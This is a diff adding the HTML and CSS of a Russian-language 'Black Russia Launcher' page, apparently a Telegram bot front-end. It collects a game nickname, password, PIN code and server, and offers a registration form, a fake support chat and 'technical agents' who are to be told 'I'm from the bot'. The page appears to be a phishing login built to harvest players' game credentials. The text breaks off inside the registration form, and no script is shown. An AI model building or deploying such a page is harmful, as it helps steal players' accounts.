@@ -1,0 +1,982 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-select=no">
+    <title>Black Russia Launcher</title>
+    <style>
+        /* === АНИМИРОВАННЫЙ ЖИДКИЙ ФОН === */
+        body {
+            background-color: #040101;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(229, 27, 27, 0.2) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(148, 12, 12, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 50% 50%, rgba(5, 1, 1, 1) 0%, #040101 100%);
+            background-size: 200% 200%;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0;
+            overflow-x: hidden; /* Полная блокировка бокового скролла на мобильных */
+            animation: liquidBackgroundAnim 12s ease infinite;
+        }
+        @keyframes liquidBackgroundAnim {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .toast-notification {
+            position: fixed; top: -60px; left: 50%; transform: translateX(-50%);
+            background: linear-gradient(90deg, #610404 0%, #940c0c 100%); border: 1px solid #d61818;
+            color: #ffffff; padding: 12px 24px; border-radius: 10px; font-size: 11px; font-weight: bold;
+            text-transform: uppercase; letter-spacing: 0.5px; box-shadow: 0px 5px 25px rgba(214, 24, 24, 0.25);
+            z-index: 1000; transition: top 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); text-align: center; white-space: nowrap;
+        }
+        .toast-notification.show { top: 20px; }
+        
+        /* Главный резиновый контейнер под экраны любых смартфонов */
+        .launcher-container { 
+            width: 100%; 
+            max-width: 380px; 
+            padding: 15px; 
+            box-sizing: border-box; 
+            position: relative; 
+        }
+        
+        .header-area { text-align: center; margin-bottom: 20px; position: relative; }
+        .bottom-info-links { display: flex; justify-content: center; gap: 20px; margin-top: 15px; margin-bottom: 10px; }
+        .info-link-btn { font-size: 10px; font-weight: bold; text-transform: uppercase; color: #574e4e; letter-spacing: 1px; cursor: pointer; user-select: none; transition: color 0.2s; }
+        .info-link-btn:hover { color: #e51b1b; }
+        .back-arrow-btn {
+            position: absolute; left: 5px; top: 5px; width: 38px; height: 38px;
+            background-color: #120303; border: 1px solid #e51b1b; border-radius: 10px;
+            color: #e51b1b; font-size: 20px; font-weight: bold; display: flex; justify-content: center; align-items: center;
+            cursor: pointer; opacity: 0; pointer-events: none; transition: 0.2s; z-index: 600;
+        }
+        .back-arrow-btn:hover { background-color: #240505; transform: scale(1.05); }
+        /* Защита логотипа от растягивания и сплющивания на смартфонах */
+        .main-bear-logo { 
+            width: 120px; 
+            height: auto; 
+            aspect-ratio: 1/1;
+            object-fit: contain;
+            margin: 0 auto 10px auto; 
+            display: block; 
+        }
+        .launcher-title { font-size: 24px; font-weight: 900; letter-spacing: 1.5px; margin: 0; text-transform: uppercase; }
+        .launcher-title span { color: #e51b1b; }
+        .subtitle-indicator { color: #e51b1b; font-size: 10px; letter-spacing: 4px; text-transform: uppercase; margin-top: 10px; font-weight: bold; }
+        .form-box { display: none; width: 100%; box-sizing: border-box; }
+        .form-box.active { display: block; }
+        
+        /* Строки ввода адаптированы под 100% ширины экрана смартфона */
+        .form-row {
+            background-color: #0b0303; border: 1px solid #1a0b0b; border-radius: 10px;
+            padding: 8px 16px; margin-bottom: 12px; display: flex; align-items: center; box-sizing: border-box; height: 58px; width: 100%; transition: border-color 0.2s;
+        }
+        .form-row:focus-within, .form-row.dropdown-open { border-color: #b31212; }
+        .form-row.shake { animation: shakeAnim 0.4s ease-in-out; border-color: #e51b1b !important; }
+        @keyframes shakeAnim {
+            0%, 100% { transform: translateX(0); } 20%, 60% { transform: translateX(-6px); } 40%, 80% { transform: translateX(6px); }
+        }
+        .clickable-row { cursor: pointer; user-select: none; }
+        .selected-server-text { color: #ffffff; font-size: 13px; margin-top: 2px; }
+        .server-select-box-wrapper { position: relative; margin-bottom: 12px; width: 100%; box-sizing: border-box; }
+        .server-select-box-wrapper .form-row { margin-bottom: 0; }
+        
+        /* Фиксированная шторка для корректного отображения на всех экранах */
+        .custom-server-dropdown {
+            position: fixed; bottom: 0; left: 50%; transform: translateX(-50%) translateY(100%);
+            width: 100%; max-width: 380px; max-height: 50vh; background-color: #0b0303; border: 1px solid #1a0b0b;
+            border-radius: 15px 15px 0 0; overflow-y: auto; z-index: 2000; box-shadow: 0px -8px 25px rgba(0, 0, 0, 0.9);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.1); box-sizing: border-box; padding: 10px 0;
+        }
+        .custom-server-dropdown.show { transform: translateX(-50%) translateY(0); }
+        .custom-server-dropdown::-webkit-scrollbar { width: 6px; }
+        .custom-server-dropdown::-webkit-scrollbar-track { background: #060101; border-radius: 0 10px 10px 0; }
+        .custom-server-dropdown::-webkit-scrollbar-thumb { background: #b31212; border-radius: 10px; }
+        .server-item { padding: 10px 16px; display: flex; align-items: center; cursor: pointer; font-size: 13px; color: #ffffff; transition: 0.15s; font-weight: 500; }
+        .server-item:hover { background-color: #1a0b0b; color: #e51b1b; }
+        .server-num-badge { color: #ff512f; font-weight: bold; margin-right: 8px; }
+        .split-pincode-container { display: flex; margin-bottom: 12px; height: 58px; width: 100%; box-sizing: border-box; }
+        .split-pincode-container.disabled-style { opacity: 0.35; }
+        .split-pincode-container:focus-within .form-row-pin, .split-pincode-container:focus-within .pincode-checkbox-wrapper { border-color: #b31212; }
+        .split-pincode-container.shake .form-row-pin, .split-pincode-container.shake .pincode-checkbox-wrapper { animation: shakeAnim 0.4s ease-in-out; border-color: #e51b1b !important; }
+        .form-row-pin { background-color: #0b0303; border: 1px solid #1a0b0b; border-right: none; border-radius: 10px 0 0 10px; padding: 8px 16px; display: flex; align-items: center; box-sizing: border-box; height: 100%; flex-grow: 1; }
+        .pincode-checkbox-wrapper { background-color: #0b0303; border: 1px solid #1a0b0b; border-left: none; border-radius: 0 10px 10px 0; padding: 8px 16px; display: flex; align-items: center; gap: 12px; height: 100%; box-sizing: border-box; flex-shrink: 0; }
+        .row-icon-left { width: 32px; height: 32px; border-radius: 8px; display: flex; justify-content: center; align-items: center; margin-right: 15px; flex-shrink: 0; transition: background 0.3s; }
+        .row-icon-left svg { width: 18px; height: 18px; fill: #ffffff; }
+        .bg-orange { background: linear-gradient(135deg, #ff512f, #dd2476); }
+        .bg-red { background: linear-gradient(135deg, #e51b1b, #8a0606); }
+        .bg-darkred { background: linear-gradient(135deg, #940f0f, #4a0202); }
+        .bg-pink { background: linear-gradient(135deg, #f857a6, #ff5858); }
+        .status-invalid { background: #a61c1c !important; } 
+        .status-valid { background: #1ca632 !important; }
+        .row-icon-right { width: 20px; height: 20px; margin-left: 10px; flex-shrink: 0; display: flex; justify-content: center; align-items: center; }
+        .row-icon-right svg { width: 100%; height: 100%; fill: #5e5454; }
+        .opacity-5 { opacity: 0.5; } .clickable { cursor: pointer; }
+        .select-arrow-down { font-size: 10px; color: #e51b1b; margin-left: auto; user-select: none; transition: 0.2s; }
+        .select-arrow-down.rotated { transform: rotate(180deg); }
+        .row-main { flex-grow: 1; min-width: 0; }
+        .row-main label { display: block; font-size: 9px; color: #574e4e; text-transform: uppercase; font-weight: bold; margin-bottom: 2px; }
+        .row-main input { width: 100%; background: none; border: none; color: #ffffff; font-size: 13px; outline: none; padding: 0; box-sizing: border-box; }
+        .row-main input::placeholder { color: #4f4343; transition: opacity 0.15s ease; }
+        .row-main input:focus::placeholder { opacity: 0; }
+        .pincode-text { font-size: 9px; color: #ffffff; text-transform: uppercase; text-align: right; line-height: 1.3; font-weight: bold; user-select: none; }
+        .launcher-check { width: 18px; height: 18px; accent-color: #c91a1a; cursor: pointer; }
+        
+        .btn-primary { width: 100%; padding: 16px; background: linear-gradient(90deg, #940f0f 0%, #d61818 100%); border: none; border-radius: 10px; color: #ffffff; font-size: 13px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; box-sizing: border-box; }
+        .text-or { text-align: center; color: #3b3232; font-size: 11px; text-transform: uppercase; margin-bottom: 15px; user-select: none; }
+        .nav-switch-btn { width: 100%; background-color: #0b0303; border: 1px solid #1a0b0b; border-radius: 10px; padding: 15px; display: flex; justify-content: space-between; align-items: center; color: #8c8080; font-size: 10px; text-transform: uppercase; cursor: pointer; margin-bottom: 25px; font-weight: bold; user-select: none; box-sizing: border-box; }
+        .red-icon-inline { color: #d12727; margin-right: 12px; } .gray-arrow { color: #443a3a; font-size: 11px; }
+        .footer-social-row { display: flex; gap: 8px; margin-bottom: 10px; width: 100%; box-sizing: border-box; }
+        .social-tab { flex: 1; height: 42px; border-radius: 8px; display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 10px; font-weight: bold; text-transform: uppercase; color: #ffffff; cursor: pointer; user-select: none; transition: opacity 0.2s; min-width: 0; text-align: center; }
+        .social-tab:hover { opacity: 0.85; } .social-tab svg { width: 15px; height: 14px; fill: #ffffff; flex-shrink: 0; }
+        .bg-tab-forum { background-color: #d11515; } .bg-tab-vk { background-color: #0077ff; } .bg-tab-tg { background-color: #229ed9; }
+        
+        .bottom-support-btn-container { display: flex; justify-content: center; margin-top: 5px; width: 100%; }
+        .bottom-support-clickable { display: flex; align-items: center; gap: 8px; color: #e51b1b; font-size: 11px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; cursor: pointer; user-select: none; transition: color 0.2s, text-shadow 0.2s; text-shadow: 0 0 10px rgba(229, 27, 27, 0.4); }
+        .bottom-support-clickable:hover { color: #ff4d4d; text-shadow: 0 0 15px rgba(229, 27, 27, 0.8); }
+        .bottom-support-clickable svg { width: 16px; height: 16px; fill: currentColor; flex-shrink: 0; }
+        .loading-box-wrapper { text-align: center; padding: 20px 5px; box-sizing: border-box; width: 100%; }
+        .loading-spinner { width: 45px; height: 45px; border: 3px solid #1c0b0b; border-top: 3px solid #d61818; border-radius: 50%; margin: 0 auto 20px auto; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-status-text { font-size: 13px; font-weight: bold; text-transform: uppercase; color: #8c8080; margin-bottom: 5px; }
+        .loading-percentage { font-size: 20px; font-weight: 900; color: #ffffff; margin-bottom: 15px; }
+        .progress-bar-bg { width: 100%; height: 6px; background-color: #120505; border-radius: 10px; overflow: hidden; }
+        .progress-bar-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #940f0f 0%, #d61818 100%); border-radius: 10px; transition: width 0.1s linear; }
+        .support-modal-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(5, 1, 1, 0.98); z-index: 500; border-radius: 15px;
+            display: flex; flex-direction: column; padding: 20px; box-sizing: border-box;
+            opacity: 0; pointer-events: none; transition: opacity 0.3s ease;
+        }
+        .support-modal-overlay.show { opacity: 1; pointer-events: auto; }
+        .support-modal-title { font-size: 14px; font-weight: bold; text-transform: uppercase; color: #e51b1b; text-align: center; margin-bottom: 12px; letter-spacing: 1px; text-shadow: 0 0 10px rgba(229, 27, 27, 0.4); }
+        .support-modal-instruction { font-size: 8.5px; color: #ff4d4d; text-align: center; font-weight: bold; text-transform: uppercase; margin-bottom: 15px; line-height: 1.4; padding: 0 5px; letter-spacing: 0.3px; }
+        .agent-card { width: 100%; background-color: #0b0303; border: 1px solid #1a0b0b; border-radius: 10px; padding: 12px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; box-sizing: border-box; }
+        .agent-info { display: flex; align-items: center; gap: 12px; min-width: 0; }
+        .agent-avatar { width: 36px; height: 36px; background: linear-gradient(135deg, #940f0f, #d61818); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 10px rgba(214, 24, 24, 0.3); flex-shrink: 0; }
+        .agent-avatar svg { width: 22px; height: 22px; fill: #ffffff; }
+        .agent-name { font-size: 11px; font-weight: bold; color: white; margin-bottom: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .agent-role { font-size: 8.5px; color: #6e6464; text-transform: uppercase; font-weight: bold; letter-spacing: 0.5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .btn-agent-vk { background-color: #0077ff; border: none; border-radius: 6px; color: white; font-size: 9px; font-weight: bold; padding: 8px 12px; cursor: pointer; text-transform: uppercase; flex-shrink: 0; }
+        .btn-agent-vk:hover { background-color: #0062d4; }
+        .btn-support-chat { width: 100%; padding: 12px; background-color: #1c0606; border: 1px solid #e51b1b; border-radius: 10px; color: #e51b1b; font-size: 11px; font-weight: bold; text-transform: uppercase; cursor: pointer; text-align: center; margin-top: auto; margin-bottom: 10px; transition: 0.2s; box-shadow: 0 0 10px rgba(229, 27, 27, 0.2); box-sizing: border-box; }
+        .btn-support-chat:hover { background-color: #e51b1b; color: white; box-shadow: 0 0 15px rgba(229, 27, 27, 0.5); }
+        .btn-support-close { width: 100%; padding: 12px; background-color: #0b0303; border: 1px solid #1a0b0b; border-radius: 10px; color: #574e4e; font-size: 11px; font-weight: bold; text-transform: uppercase; cursor: pointer; text-align: center; box-sizing: border-box; }
+        .chat-container-box { display: none; flex-direction: column; height: 100%; width: 100%; position: absolute; top: 0; left: 0; background-color: #050101; z-index: 510; border-radius: 15px; padding: 15px; box-sizing: border-box; }
+        .chat-container-box.show { display: flex; }
+        .chat-header { display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #1a0b0b; padding-bottom: 10px; margin-bottom: 10px; width: 100%; box-sizing: border-box; }
+        .chat-title-info { display: flex; align-items: center; gap: 10px; }
+        .chat-title-info .status-dot { width: 6px; height: 6px; background-color: #1ca632; border-radius: 50%; box-shadow: 0 0 8px #1ca632; }
+        .chat-title-text { font-size: 12px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; }
+        .btn-chat-back { background: none; border: 1px solid #1a0b0b; color: #574e4e; font-size: 11px; font-weight: bold; border-radius: 6px; padding: 4px 10px; cursor: pointer; text-transform: uppercase; }
+        .btn-chat-back:hover { color: white; border-color: #574e4e; }
+        
+        .chat-messages-area { flex-grow: 1; overflow-y: auto; padding: 5px; display: flex; flex-direction: column; gap: 10px; margin-bottom: 10px; width: 100%; box-sizing: border-box; }
+        .chat-messages-area::-webkit-scrollbar { width: 4px; }
+        .chat-messages-area::-webkit-scrollbar-thumb { background: #1a0b0b; border-radius: 10px; }
+        
+        .chat-bubble { max-width: 80%; padding: 10px 14px; border-radius: 12px; font-size: 12px; line-height: 1.4; word-wrap: break-word; }
+        .chat-bubble.agent { background-color: #0b0303; border: 1px solid #1a0b0b; align-self: flex-start; color: #ffffff; border-top-left-radius: 2px; }
+        .chat-bubble.user { background-color: #e51b1b; align-self: flex-end; color: #ffffff; border-top-right-radius: 2px; box-shadow: 0px 4px 12px rgba(229, 27, 27, 0.2); }
+        .chat-bubble-sender { font-size: 8px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; color: #574e4e; margin-bottom: 3px; }
+        .chat-bubble.user .chat-bubble-sender { color: #ffb3b3; }
+        .typing-dots-container { display: flex; align-items: center; gap: 4px; padding: 4px 0; }
+        .typing-dot { width: 6px; height: 6px; background-color: #e51b1b; border-radius: 50%; box-shadow: 0 0 8px rgba(229, 27, 27, 0.8); animation: typingBounceAnim 1.4s infinite ease-in-out both; }
+        .typing-dot:nth-child(1) { animation-delay: -0.32s; }
+        .typing-dot:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes typingBounceAnim { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1.0) translateY(-6px); } }
+
+        .chat-input-row { display: flex; align-items: center; background-color: #0b0303; border: 1px solid #1a0b0b; border-radius: 10px; padding: 6px 12px; height: 46px; width: 100%; box-sizing: border-box; }
+        .chat-input-row input { flex-grow: 1; background: none; border: none; color: white; font-size: 12px; outline: none; min-width: 0; }
+        .chat-input-row input::placeholder { color: #4f4343; }
+        .btn-chat-send { background: none; border: none; color: #e51b1b; font-size: 14px; cursor: pointer; padding-left: 10px; display: flex; align-items: center; transition: color 0.2s; flex-shrink: 0; }
+        .btn-chat-send:hover { color: #ff4d4d; }
+        /* === TELEGRAM WEBAPP АДАПТАЦИЯ === */
+        .tg-user-bar {
+            display: none; align-items: center; gap: 10px; background-color: #0b0303; border: 1px solid #1a0b0b;
+            border-radius: 10px; padding: 8px 12px; margin-bottom: 14px; box-sizing: border-box; width: 100%;
+        }
+        .tg-user-bar.show { display: flex; }
+        .tg-user-bar img { width: 30px; height: 30px; border-radius: 50%; border: 1px solid #e51b1b; flex-shrink: 0; }
+        .tg-user-bar .tg-user-name { font-size: 12px; font-weight: bold; color: #ffffff; }
+        .tg-user-bar .tg-user-sub { font-size: 8px; color: #574e4e; text-transform: uppercase; font-weight: bold; letter-spacing: 0.5px; }
+    </style>
+</head>
+<body>
+    <!-- Всплывающее игровое уведомление лаунчера -->
+    <div id="error-toast" class="toast-notification">Ошибка!</div>
+
+    <div class="launcher-container">
+        
+        <!-- === ОКНО ВЫБОРА СПЕЦИАЛИСТОВ ПОДДЕРЖКИ === -->
+        <div id="support-modal" class="support-modal-overlay">
+            <div class="support-modal-title">Служба Поддержки</div>
+            
+            <!-- Инструкция для связи с тех. агентами -->
+            <div class="support-modal-instruction">
+                Нажмите профиль ➔ три точки ➔ отправить вопрос:<br>«Здравствуйте, я от бота, мне нужна помощь»
+            </div>
+            <!-- Технический спец. агент №1 (Бахида Тадакатцу) -->
+            <div class="agent-card">
+                <div class="agent-info">
+                    <div class="agent-avatar">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12c0 3.1.1 5.3 1 7.2h2c-.6-1.5-.7-3-.7-5.2 0-4.4 3.1-8 7.7-8s7.7 3.6 7.7 8c0 1.2-.2 2.6-.6 3.6l1.6.8c.6-1.2.9-2.8.9-4.4 0-4.97-4.03-9-9-9z"/><path d="M12 6c-3.3 0-6 2.7-6 6v3c0 .6.4 1 1 1h1c.6 0 1-.4 1-1v-4c0-.6-.4-1-1-1H7c0-2.2 2.2-4 5-4s5 1.8 5 4h-1c-.6 0-1 .4-1 1v4c0 .6.4 1 1 1h1c.6 0 1-.4 1-1v-3c0-3.3-2.7-6-6-6z"/><path d="M19 14.5c-.3 0-.5.2-.5.5 0 .8-.5 1.5-1.3 1.8l.5 1.4c1.2-.5 1.8-1.7 1.8-3.2 0-.3-.2-.5-.5-.5z"/><circle cx="12" cy="11" r="2.5"/><path d="M12 14.5c-2 0-4 1.2-4.8 3-.2.4 0 .9.4 1.1s.9 0 1.1-.4c.5-1.1 1.8-1.7 3.3-1.7s2.8.6 3.3 1.7c.2.4.7.6 1.1.4s.6-.7.4-1.1c-.8-1.8-2.8-3-4.8-3z"/></svg>
+                    </div>
+                    <div>
+                        <div class="agent-name">Технический спец. агент №1</div>
+                        <div class="agent-role">Бахида Тадакатцу</div>
+                    </div>
+                </div>
+                <button class="btn-agent-vk" onclick="window.open('https://vk.com')">Связаться</button>
+            </div>
+
+            <!-- Технический спец. агент №2 (Desmond Deluchi) -->
+            <div class="agent-card">
+                <div class="agent-info">
+                    <div class="agent-avatar">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12c0 3.1.1 5.3 1 7.2h2c-.6-1.5-.7-3-.7-5.2 0-4.4 3.1-8 7.7-8s7.7 3.6 7.7 8c0 1.2-.2 2.6-.6 3.6l1.6.8c.6-1.2.9-2.8.9-4.4 0-4.97-4.03-9-9-9z"/><path d="M12 6c-3.3 0-6 2.7-6 6v3c0 .6.4 1 1 1h1c.6 0 1-.4 1-1v-4c0-.6-.4-1-1-1H7c0-2.2 2.2-4 5-4s5 1.8 5 4h-1c-.6 0-1 .4-1 1v4c0 .6.4 1 1 1h1c.6 0 1-.4 1-1v-3c0-3.3-2.7-6-6-6z"/><path d="M19 14.5c-.3 0-.5.2-.5.5 0 .8-.5 1.5-1.3 1.8l.5 1.4c1.2-.5 1.8-1.7 1.8-3.2 0-.3-.2-.5-.5-.5z"/><circle cx="12" cy="11" r="2.5"/><path d="M12 14.5c-2 0-4 1.2-4.8 3-.2.4 0 .9.4 1.1s.9 0 1.1-.4c.5-1.1 1.8-1.7 3.3-1.7s2.8.6 3.3 1.7c.2.4.7.6 1.1.4s.6-.7.4-1.1c-.8-1.8-2.8-3-4.8-3z"/></svg>
+                    </div>
+                    <div>
+                        <div class="agent-name">Технический спец. агент №2</div>
+                        <div class="agent-role">Desmond Deluchi</div>
+                    </div>
+                </div>
+                <button class="btn-agent-vk" onclick="window.open('https://vk.com')">Связаться</button>
+            </div>
+            <!-- Технический спец. агент №3 (Sander Kligan) -->
+            <div class="agent-card">
+                <div class="agent-info">
+                    <div class="agent-avatar">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12c0 3.1.1 5.3 1 7.2h2c-.6-1.5-.7-3-.7-5.2 0-4.4 3.1-8 7.7-8s7.7 3.6 7.7 8c0 1.2-.2 2.6-.6 3.6l1.6.8c.6-1.2.9-2.8.9-4.4 0-4.97-4.03-9-9-9z"/><path d="M12 6c-3.3 0-6 2.7-6 6v3c0 .6.4 1 1 1h1c.6 0 1-.4 1-1v-4c0-.6-.4-1-1-1H7c0-2.2 2.2-4 5-4s5 1.8 5 4h-1c-.6 0-1 .4-1 1v4c0 .6.4 1 1 1h1c.6 0 1-.4 1-1v-3c0-3.3-2.7-6-6-6z"/><path d="M19 14.5c-.3 0-.5.2-.5.5 0 .8-.5 1.5-1.3 1.8l.5 1.4c1.2-.5 1.8-1.7 1.8-3.2 0-.3-.2-.5-.5-.5z"/><circle cx="12" cy="11" r="2.5"/><path d="M12 14.5c-2 0-4 1.2-4.8 3-.2.4 0 .9.4 1.1s.9 0 1.1-.4c.5-1.1 1.8-1.7 3.3-1.7s2.8.6 3.3 1.7c.2.4.7.6 1.1.4s.6-.7.4-1.1c-.8-1.8-2.8-3-4.8-3z"/></svg>
+                    </div>
+                    <div>
+                        <div class="agent-name">Технический спец. агент №3</div>
+                        <div class="agent-role">Sander Kligan</div>
+                    </div>
+                </div>
+                <button class="btn-agent-vk" onclick="window.open('https://vk.com')">Связаться</button>
+            </div>
+
+            <!-- Кнопки перехода во внутренний онлайн-чат -->
+            <button class="btn-support-chat" onclick="openInternalOnlineChat()">Открыть онлайн-чат поддержки</button>
+            <button class="btn-support-close" onclick="toggleSupportModal(false)">Вернуться назад</button>
+        </div>
+        <!-- === ВНУТРЕННИЙ ОНЛАЙН-ЧАТ ПОДДЕРЖКИ ПРЯМО В ЛАУНЧЕРЕ === -->
+        <div id="internal-chat-box" class="chat-container-box">
+            <div class="chat-header">
+                <div class="chat-title-info">
+                    <div class="status-dot"></div>
+                    <div class="chat-title-text">Чат с техподдержкой</div>
+                </div>
+                <button class="btn-chat-back" onclick="closeInternalOnlineChat()">Назад</button>
+            </div>
+
+            <!-- Область истории переписки со скроллом -->
+            <div class="chat-messages-area" id="chat-messages-container">
+                <div class="chat-bubble agent">
+                    <div class="chat-bubble-sender">Тех. Агент</div>
+                    Здравствуйте! Ваш вопрос будет зафиксирован. Опишите проблему, и мы постараемся помочь.
+                </div>
+            </div>
+
+            <!-- Поле ввода вопроса -->
+            <div class="chat-input-row">
+                <input type="text" placeholder="Введите ваше сообщение..." id="chat-user-message-input" autocomplete="off">
+                <button class="btn-chat-send" onclick="sendUserMessageInChat()">➔</button>
+            </div>
+        </div>
+
+        <!-- Шапка лаунчера -->
+        <div class="header-area" id="launcher-header">
+            <div id="top-back-arrow" class="back-arrow-btn" onclick="handleBackArrowClick()">←</div>
+            <img src="logo.png" alt="Black Russia Bear" class="main-bear-logo">
+            <h1 class="launcher-title">BLACK <span>RUSSIA</span></h1>
+            <div class="subtitle-indicator" id="auth-subtitle">✦ вход в аккаунт ✦</div>
+        </div>
+
+        <!-- Блок авторизованного пользователя Telegram -->
+        <div class="tg-user-bar" id="tg-user-bar">
+            <img id="tg-user-avatar" src="" alt="TG">
+            <div>
+                <div class="tg-user-name" id="tg-user-name">Telegram User</div>
+                <div class="tg-user-sub" id="tg-user-sub">вход через telegram</div>
+            </div>
+        </div>
+
+        <!-- СТРАНИЦА 1: ОКНО ВХОДА -->
+        <div id="screen-login" class="form-box active">
+            <!-- Поле: Ник -->
+            <div class="form-row" id="row-login-nick">
+                <div class="row-icon-left bg-orange" id="nick-icon-bg">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                </div>
+                <div class="row-main">
+                    <label>Ник</label>
+                    <input type="text" placeholder="Введите игровой ник" id="nick-input" autocomplete="off">
+                </div>
+            </div>
+
+            <!-- Поле: Пароль -->
+            <div class="form-row" id="row-login-pass">
+                <div class="row-icon-left bg-red" id="pass-icon-bg">
+                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                </div>
+                <div class="row-main">
+                    <label>Пароль</label>
+                    <input type="password" placeholder="Введите пароль" id="login-password-input" autocomplete="off">
+                </div>
+                <div class="row-icon-right opacity-5 clickable" onclick="togglePasswordView('login-password-input')">👁</div>
+            </div>
+
+            <!-- Поле: Пин-код (Вход) -->
+            <div class="split-pincode-container disabled-style" id="pincode-row-container">
+                <div class="form-row-pin">
+                    <div class="row-icon-left bg-darkred" id="pin-icon-bg">
+                        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                    </div>
+                    <div class="row-main">
+                        <label>Пин-код</label>
+                        <input type="password" placeholder="Пин-код отключен" id="pin-input" disabled autocomplete="off">
+                    </div>
+                </div>
+                <div class="pincode-checkbox-wrapper">
+                    <span class="pincode-text">У меня есть<br>пин-код</span>
+                    <input type="checkbox" class="launcher-check" id="pin-toggle-checkbox">
+                </div>
+            </div>
+            <!-- Поле: Выбор сервера -->
+            <div class="server-select-box-wrapper">
+                <div class="form-row clickable-row" id="server-field-trigger">
+                    <div class="row-icon-left bg-pink" id="server-icon-bg">
+                        <svg viewBox="0 0 24 24"><path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z"/></svg>
+                    </div>
+                    <div class="row-main">
+                        <label>Выбор сервера</label>
+                        <div class="selected-server-text" id="current-selected-server">Выберите сервер</div>
+                    </div>
+                    <div class="select-arrow-down" id="server-arrow-icon">▼</div>
+                </div>
+            </div>
+
+            <button class="btn-primary" onclick="handleLoginClick()">Войти в аккаунт →</button>
+            <div class="text-or">или</div>
+            
+            <div class="nav-switch-btn" onclick="changeAuthScreen('recovery')">
+                <span><span class="red-icon-inline">🔓</span> Восстановление пароля</span>
+                <span class="gray-arrow">❯</span>
+            </div>
+
+            <div class="nav-switch-btn" onclick="changeAuthScreen('register')" style="margin-bottom: 20px;">
+                <span><span class="red-icon-inline">📝</span> Создать новый аккаунт</span>
+                <span class="gray-arrow">❯</span>
+            </div>
+        </div>
+        <!-- СТРАНИЦА 1.2: ПОЛНАЯ РЕГИСТРАЦИЯ ИГРОВОГО АККАУНТА -->
+        <div id="screen-register" class="form-box">
+            <!-- Поле: Ник -->
+            <div class="form-row" id="row-reg-nick">
+                <div class="row-icon-left bg-orange" id="reg-nick-icon-bg">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                </div>
+                <div class="row-main">
+                    <label>Ник нового аккаунта</label>
+                    <input type="text" placeholder="Пример: Alexander_Gromov" id="reg-nick-input" autocomplete="off">
+                </div>
+            </div>
+
+            <!-- Поле: Пароль -->
+            <div class="form-row" id="row-reg-pass">
+                <div class="row-icon-left bg-red" id="reg-pass-icon-bg">
+                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                </div>
+                <div class="row-main">
+                    <label>Пароль нового аккаунта</label>
+                    <input type="password" placeholder="Придумайте пароль" id="reg-password-input" autocomplete="off">
+                </div>
+                <div class="row-icon-right opacity-5 clickable" onclick="togglePasswordView('reg-password-input')">👁</div>
+            </div>
